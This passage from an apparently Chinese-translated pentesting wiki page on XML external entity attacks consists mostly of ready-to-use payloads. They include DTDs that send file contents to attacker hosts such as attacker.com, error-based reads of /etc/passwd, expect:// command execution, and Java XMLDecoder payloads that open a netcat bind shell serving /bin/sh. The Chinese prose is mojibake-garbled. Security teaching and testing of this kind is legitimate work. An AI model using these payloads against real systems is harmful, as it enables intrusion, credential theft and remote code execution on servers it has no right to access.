+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
</code></pre>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-7"?&gt;
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
</code></pre>
<h3 id="file-åè®®ç»•è¿‡"><a class="header" href="#file-åè®®ç»•è¿‡">File:/ åè®®ç»•è¿‡</a></h3>
<p>å¦‚æœç½‘ç«™ä½¿ç”¨ PHPï¼Œå¯ä»¥ä½¿ç”¨ <strong>php wrappers</strong> <code>php://filter/convert.base64-encode/resource=</code> æ¥ <strong>è®¿é—®å†…éƒ¨æ–‡ä»¶</strong>ã€‚</p>
<p>å¦‚æœç½‘ç«™ä½¿ç”¨ Javaï¼Œæ‚¨å¯ä»¥æ£€æŸ¥ <a href="xxe-xee-xml-external-entity.html#jar-protocol"><strong>jar: åè®®</strong></a>ã€‚</p>
<h3 id="html-å®ä½“"><a class="header" href="#html-å®ä½“">HTML å®ä½“</a></h3>
<p>æ¥è‡ª <a href="https://github.com/Ambrotd/XXE-Notes"><strong>https://github.com/Ambrotd/XXE-Notes</strong></a><br />
æ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ª <strong>å®ä½“å†…éƒ¨çš„å®ä½“</strong>ï¼Œé€šè¿‡ <strong>html å®ä½“</strong> ç¼–ç ï¼Œç„¶åè°ƒç”¨å®ƒæ¥ <strong>åŠ è½½ dtd</strong>ã€‚<br />
è¯·æ³¨æ„ï¼Œä½¿ç”¨çš„ <strong>HTML å®ä½“</strong> éœ€è¦æ˜¯ <strong>æ•°å­—</strong>ï¼ˆå¦‚ [åœ¨è¿™ä¸ªä¾‹å­ä¸­](<a href="https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&amp;input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C">https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,'Numeric entities'%29&amp;input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\</a>).</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % a "&amp;#x3C;&amp;#x21;&amp;#x45;&amp;#x4E;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x25;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4D;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x6F;&amp;#x75;&amp;#x72;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x65;&amp;#x72;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6D;&amp;#x2F;&amp;#x62;&amp;#x79;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x2E;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x3E;" &gt;%a;%dtd;]&gt;
&lt;data&gt;
&lt;env&gt;&amp;exfil;&lt;/env&gt;
&lt;/data&gt;
</code></pre>
<p>DTD ç¤ºä¾‹ï¼š</p>
<pre><code class="language-xml">&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag"&gt;
&lt;!ENTITY % abt "&lt;!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'&gt;"&gt;
%abt;
%exfil;
</code></pre>
<h2 id="php-wrappers"><a class="header" href="#php-wrappers">PHP Wrappers</a></h2>
<h3 id="base64-1"><a class="header" href="#base64-1">Base64</a></h3>
<p><strong>æå–</strong> <em><strong>index.php</strong></em></p>
<pre><code class="language-xml">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;
</code></pre>
<h4 id="æå–å¤–éƒ¨èµ„æº"><a class="header" href="#æå–å¤–éƒ¨èµ„æº"><strong>æå–å¤–éƒ¨èµ„æº</strong></a></h4>
<pre><code class="language-xml">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"&gt; ]&gt;
</code></pre>
<h3 id="è¿œç¨‹ä»£ç æ‰§è¡Œ"><a class="header" href="#è¿œç¨‹ä»£ç æ‰§è¡Œ">è¿œç¨‹ä»£ç æ‰§è¡Œ</a></h3>
<p><strong>å¦‚æœåŠ è½½äº† PHP "expect" æ¨¡å—</strong></p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
</code></pre>
<h2 id="soap---xee"><a class="header" href="#soap---xee"><strong>SOAP - XEE</strong></a></h2>
<pre><code class="language-xml">&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;&lt;/soap:Body&gt;
</code></pre>
<h2 id="xliff---xxe"><a class="header" href="#xliff---xxe">XLIFF - XXE</a></h2>
<p>è¿™ä¸ªä¾‹å­çµæ„Ÿæ¥æºäº <a href="https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe">https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe</a></p>
<p>XLIFFï¼ˆXMLæœ¬åœ°åŒ–äº¤æ¢æ–‡ä»¶æ ¼å¼ï¼‰ç”¨äºæ ‡å‡†åŒ–æœ¬åœ°åŒ–è¿‡ç¨‹ä¸­çš„æ•°æ®äº¤æ¢ã€‚å®ƒæ˜¯ä¸€ç§åŸºäºXMLçš„æ ¼å¼ï¼Œä¸»è¦ç”¨äºåœ¨æœ¬åœ°åŒ–è¿‡ç¨‹ä¸­åœ¨å·¥å…·ä¹‹é—´ä¼ è¾“å¯æœ¬åœ°åŒ–æ•°æ®ï¼Œå¹¶ä½œä¸ºè®¡ç®—æœºè¾…åŠ©ç¿»è¯‘ï¼ˆCATï¼‰å·¥å…·çš„é€šç”¨äº¤æ¢æ ¼å¼ã€‚</p>
<h3 id="blind-request-analysis"><a class="header" href="#blind-request-analysis">Blind Request Analysis</a></h3>
<p>å‘æœåŠ¡å™¨å‘é€äº†ä»¥ä¸‹å†…å®¹çš„è¯·æ±‚ï¼š</p>
<pre><code class="language-xml">------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE XXE [
&lt;!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"&gt; %remote; ]&gt;
&lt;xliff srcLang="en" trgLang="ms-MY" version="2.0"&gt;&lt;/xliff&gt;
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
</code></pre>
<p>ç„¶è€Œï¼Œè¿™ä¸ªè¯·æ±‚è§¦å‘äº†ä¸€ä¸ªå†…éƒ¨æœåŠ¡å™¨é”™è¯¯ï¼Œç‰¹åˆ«æåˆ°æ ‡è®°å£°æ˜çš„é—®é¢˜ï¼š</p>
<pre><code class="language-json">{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
</code></pre>
<p>å°½ç®¡å‡ºç°é”™è¯¯ï¼Œä½†åœ¨ Burp Collaborator ä¸Šè®°å½•äº†ä¸€æ¬¡å‘½ä¸­ï¼Œè¡¨æ˜ä¸å¤–éƒ¨å®ä½“æœ‰æŸç§ç¨‹åº¦çš„äº¤äº’ã€‚</p>
<p>å¸¦å¤–æ•°æ®æ³„éœ² ä¸ºäº†æ³„éœ²æ•°æ®ï¼Œå‘é€äº†ä¸€ä¸ªä¿®æ”¹è¿‡çš„è¯·æ±‚ï¼š</p>
<pre><code>------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE XXE [
&lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt; %remote; ]&gt;
&lt;xliff srcLang="en" trgLang="ms-MY" version="2.0"&gt;&lt;/xliff&gt;
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
</code></pre>
<p>è¿™ç§æ–¹æ³•è¡¨æ˜ç”¨æˆ·ä»£ç†æŒ‡ç¤ºä½¿ç”¨Java 1.8ã€‚è¿™ä¸ªç‰ˆæœ¬çš„Javaçš„ä¸€ä¸ªæ˜¾è‘—é™åˆ¶æ˜¯æ— æ³•ä½¿ç”¨å¸¦å¤–æŠ€æœ¯æ£€ç´¢åŒ…å«æ¢è¡Œç¬¦çš„æ–‡ä»¶ï¼Œä¾‹å¦‚/etc/passwdã€‚</p>
<p>åŸºäºé”™è¯¯çš„æ•°æ®å¤–æ³„ ä¸ºäº†å…‹æœè¿™ä¸ªé™åˆ¶ï¼Œé‡‡ç”¨äº†åŸºäºé”™è¯¯çš„æ–¹æ³•ã€‚DTDæ–‡ä»¶çš„ç»“æ„å¦‚ä¸‹ï¼Œä»¥è§¦å‘åŒ…å«ç›®æ ‡æ–‡ä»¶æ•°æ®çš„é”™è¯¯ï¼š</p>
<pre><code class="language-xml">&lt;!ENTITY % data SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % foo "&lt;!ENTITY &amp;#37; xxe SYSTEM 'file:///nofile/'&gt;"&gt;
%foo;
%xxe;
</code></pre>
<p>æœåŠ¡å™¨è¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œé‡è¦çš„æ˜¯åæ˜ äº†ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œè¡¨æ˜æœåŠ¡å™¨æ­£åœ¨å°è¯•è®¿é—®æŒ‡å®šçš„æ–‡ä»¶ï¼š</p>
<pre><code class="language-javascript">{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
</code></pre>
<p>è¦åœ¨é”™è¯¯æ¶ˆæ¯ä¸­åŒ…å«æ–‡ä»¶çš„å†…å®¹ï¼ŒDTD æ–‡ä»¶è¢«è°ƒæ•´ï¼š</p>
<pre><code class="language-xml">&lt;!ENTITY % data SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % foo "&lt;!ENTITY &amp;#37; xxe SYSTEM 'file:///nofile/%data;'&gt;"&gt;
%foo;
%xxe;
</code></pre>
<p>æ­¤ä¿®æ”¹å¯¼è‡´æ–‡ä»¶å†…å®¹çš„æˆåŠŸå¤–æ³„ï¼Œå› ä¸ºå®ƒåæ˜ åœ¨é€šè¿‡HTTPå‘é€çš„é”™è¯¯è¾“å‡ºä¸­ã€‚è¿™è¡¨æ˜æˆåŠŸè¿›è¡Œäº†XXEï¼ˆXMLå¤–éƒ¨å®ä½“ï¼‰æ”»å‡»ï¼Œåˆ©ç”¨äº†å¸¦å¤–å’ŒåŸºäºé”™è¯¯çš„æŠ€æœ¯æ¥æå–æ•æ„Ÿä¿¡æ¯ã€‚</p>
<h2 id="rss---xee"><a class="header" href="#rss---xee">RSS - XEE</a></h2>
<p>æœ‰æ•ˆçš„XMLæ ¼å¼ä¸ºRSSï¼Œä»¥åˆ©ç”¨XXEæ¼æ´ã€‚</p>
<h3 id="ping-back"><a class="header" href="#ping-back">Ping back</a></h3>
<p>ç®€å•çš„HTTPè¯·æ±‚åˆ°æ”»å‡»è€…æœåŠ¡å™¨</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;
&lt;!ENTITY xxe SYSTEM "http://&lt;AttackIP&gt;/rssXXE" &gt;]&gt;
&lt;rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"&gt;
&lt;channel&gt;
&lt;title&gt;XXE Test Blog&lt;/title&gt;
&lt;link&gt;http://example.com/&lt;/link&gt;
&lt;description&gt;XXE Test Blog&lt;/description&gt;
&lt;lastBuildDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/lastBuildDate&gt;
&lt;item&gt;
&lt;title&gt;&amp;xxe;&lt;/title&gt;
&lt;link&gt;http://example.com&lt;/link&gt;
&lt;description&gt;Test Post&lt;/description&gt;
&lt;author&gt;author@example.com&lt;/author&gt;
&lt;pubDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/pubDate&gt;
&lt;/item&gt;
&lt;/channel&gt;
&lt;/rss&gt;
</code></pre>
<h3 id="è¯»å–æ–‡ä»¶-1"><a class="header" href="#è¯»å–æ–‡ä»¶-1">è¯»å–æ–‡ä»¶</a></h3>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"&gt;
&lt;channel&gt;
&lt;title&gt;The Blog&lt;/title&gt;
&lt;link&gt;http://example.com/&lt;/link&gt;
&lt;description&gt;A blog about things&lt;/description&gt;
&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;
&lt;item&gt;
&lt;title&gt;&amp;xxe;&lt;/title&gt;
&lt;link&gt;http://example.com&lt;/link&gt;
&lt;description&gt;a post&lt;/description&gt;
&lt;author&gt;author@example.com&lt;/author&gt;
&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;
&lt;/item&gt;
&lt;/channel&gt;
&lt;/rss&gt;
</code></pre>
<h3 id="è¯»å–æºä»£ç "><a class="header" href="#è¯»å–æºä»£ç ">è¯»å–æºä»£ç </a></h3>
<p>ä½¿ç”¨ PHP base64 è¿‡æ»¤å™¨</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;
&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" &gt;]&gt;
&lt;rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"&gt;
&lt;channel&gt;
&lt;title&gt;The Blog&lt;/title&gt;
&lt;link&gt;http://example.com/&lt;/link&gt;
&lt;description&gt;A blog about things&lt;/description&gt;
&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;
&lt;item&gt;
&lt;title&gt;&amp;xxe;&lt;/title&gt;
&lt;link&gt;http://example.com&lt;/link&gt;
&lt;description&gt;a post&lt;/description&gt;
&lt;author&gt;author@example.com&lt;/author&gt;
&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;
&lt;/item&gt;
&lt;/channel&gt;
&lt;/rss&gt;
</code></pre>
<h2 id="java-xmldecoder-xee-to-rce"><a class="header" href="#java-xmldecoder-xee-to-rce">Java XMLDecoder XEE to RCE</a></h2>
<p>XMLDecoder æ˜¯ä¸€ä¸ª Java ç±»ï¼Œå®ƒæ ¹æ® XML æ¶ˆæ¯åˆ›å»ºå¯¹è±¡ã€‚å¦‚æœæ¶æ„ç”¨æˆ·èƒ½å¤Ÿè®©åº”ç”¨ç¨‹åºåœ¨è°ƒç”¨ <strong>readObject</strong> æ–¹æ³•æ—¶ä½¿ç”¨ä»»æ„æ•°æ®ï¼Œä»–å°†ç«‹å³è·å¾—æœåŠ¡å™¨ä¸Šçš„ä»£ç æ‰§è¡Œæƒé™ã€‚</p>
<h3 id="using-runtimeexec"><a class="header" href="#using-runtimeexec">Using Runtime().exec()</a></h3>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java version="1.7.0_21" class="java.beans.XMLDecoder"&gt;
&lt;object class="java.lang.Runtime" method="getRuntime"&gt;
&lt;void method="exec"&gt;
&lt;array class="java.lang.String" length="6"&gt;
&lt;void index="0"&gt;
&lt;string&gt;/usr/bin/nc&lt;/string&gt;
&lt;/void&gt;
&lt;void index="1"&gt;
&lt;string&gt;-l&lt;/string&gt;
&lt;/void&gt;
&lt;void index="2"&gt;
&lt;string&gt;-p&lt;/string&gt;
&lt;/void&gt;
&lt;void index="3"&gt;
&lt;string&gt;9999&lt;/string&gt;
&lt;/void&gt;
&lt;void index="4"&gt;
&lt;string&gt;-e&lt;/string&gt;
&lt;/void&gt;
&lt;void index="5"&gt;
&lt;string&gt;/bin/sh&lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;/void&gt;
&lt;/object&gt;
&lt;/java&gt;
</code></pre>
<h3 id="processbuilder"><a class="header" href="#processbuilder">ProcessBuilder</a></h3>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java version="1.7.0_21" class="java.beans.XMLDecoder"&gt;
&lt;void class="java.lang.ProcessBuilder"&gt;
&lt;array class="java.lang.String" length="6"&gt;
&lt;void index="0"&gt;
&lt;string&gt;/usr/bin/nc&lt;/string&gt;
&lt;/void&gt;
&lt;void index="1"&gt;
&lt;string&gt;-l&lt;/string&gt;
&lt;/void&gt;
&lt;void index="2"&gt;
&lt;string&gt;-p&lt;/string&gt;
&lt;/void&gt;
&lt;void index="3"&gt;
&lt;string&gt;9999&lt;/string&gt;
&lt;/void&gt;
&lt;void index="4"&gt;
&lt;string&gt;-e&lt;/string&gt;
&lt;/void&gt;
&lt;void index="5"&gt;
&lt;string&gt;/bin/sh&lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;void method="start" id="process"&gt;
&lt;/void&gt;
&lt;/void&gt;
&lt;/java&gt;
</code></pre>
<h2 id="å·¥å…·"><a class="header" href="#å·¥å…·">å·¥å…·</a></h2>
<p>{% embed url="https://github.com/luisfontes19/xxexploiter" %}</p>
<h2 id="å‚è€ƒèµ„æ–™"><a class="header" href="#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></h2>
<ul>
<li><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf</a>\</li>
<li><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a>\</li>
<li>é€šè¿‡ HTTP ä½¿ç”¨è‡ªå®šä¹‰å¤–éƒ¨ DTD æå–ä¿¡æ¯: <a href="https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/">https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/</a>\</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a>\</li>
<li><a href="https://gist.github.com/staaldraad/01415b990939494879b4">https://gist.github.com/staaldraad/01415b990939494879b4</a>\</li>
<li><a href="https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9">https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9</a>\</li>
<li><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a>\</li>
<li><a href="https://gosecure.github.io/xxe-workshop/#7">https://gosecure.github.io/xxe-workshop/#7</a></li>
</ul>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/xss-cross-site-scripting/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/xss-cross-site-scripting/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
